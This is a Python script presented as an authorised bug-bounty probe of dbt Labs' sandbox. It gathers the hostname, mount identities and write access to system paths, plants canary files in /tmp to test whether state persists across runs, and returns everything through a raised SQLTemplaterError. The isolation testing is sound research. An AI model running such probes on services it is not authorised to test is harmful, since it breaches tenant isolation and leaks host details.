MARKER = 'A145F9_R5_1B2047C13A46'
"""Authorised security-research probe (Bugcrowd dbtlabs-mbb-og1).
Reads process-local directory NAMES, and the content of ONE file whose
name this researcher chose and planted. No environment, no network, no
instance metadata, no foreign file content."""
import json, os, time
from sqlfluff.core.errors import SQLTemplaterError
CANARY = 'CLEAVE_CANARY_1b2047c13a46.txt'
out = {}

def _mine():
    parts = os.getcwd().rstrip('/').split('/')
    return parts[-2] if len(parts) >= 2 else ''

# Cross-RUN persistence probe. Reads back ONLY files this researcher planted,
# by exact name. Writes exactly two small, self-identifying text files.
SHARED = ("/tmp/" + CANARY, "/tmp/jobs/" + CANARY)
try:
    out["host"] = __import__("socket").gethostname()
    mine = _mine()
    now = time.time()
    # 1. READ FIRST: did an EARLIER run of ours leave a canary on this pod?
    found = []
    for p in SHARED:
        try:
            if os.path.isfile(p):
                with open(p) as fh:
                    found.append([p, int(now - os.stat(p).st_mtime), fh.read()[:260]])
        except Exception as exc:
            found.append([p, -1, "ERR:" + type(exc).__name__])
    out["preexisting"] = found
    out["n_preexisting"] = len(found)
    # 2. identity of the scratch mounts, so two runs on one pod are comparable
    for lbl, path in (("root", "/"), ("tmp", "/tmp"), ("jobs", "/tmp/jobs")):
        try:
            s = os.stat(path)
            out["id_" + lbl] = [s.st_dev, s.st_ino, int(now - s.st_mtime)]
        except Exception as exc:
            out["id_" + lbl] = "ERR:" + type(exc).__name__
    # 3. writability CHECKS ONLY -- nothing is written to any of these
    probe = ["/", "/tmp", "/tmp/jobs", "/etc", "/venv", "/usr/lib", "/home"]
    try:
        import sqlfluff as _sf
        probe.append(os.path.dirname(_sf.__file__))
    except Exception:
        pass
    out["w_ok"] = [[q, 1 if os.access(q, os.W_OK) else 0,
                    1 if os.path.isdir(q) else 0] for q in probe]
    # 4. PLANT: two self-identifying markers so a later run on this pod sees them
    body = json.dumps({"owner": "cleave-security-research",
                       "purpose": "authorised cross-run persistence canary, dbt MBB",
                       "planted_by_run": mine, "planted_at": int(now),
                       "pod": out["host"]}, sort_keys=True)
    planted = []
    for p in SHARED:
        try:
            with open(p, "w") as fh:
                fh.write(body + chr(10))
            planted.append([p, 1])
        except Exception as exc:
            planted.append([p, 0, type(exc).__name__])
    out["planted_shared"] = planted
except Exception as exc:
    out["err"] = type(exc).__name__ + ":" + str(exc)[:160]
raise SQLTemplaterError(MARKER + ' ' + json.dumps(out, sort_keys=True))
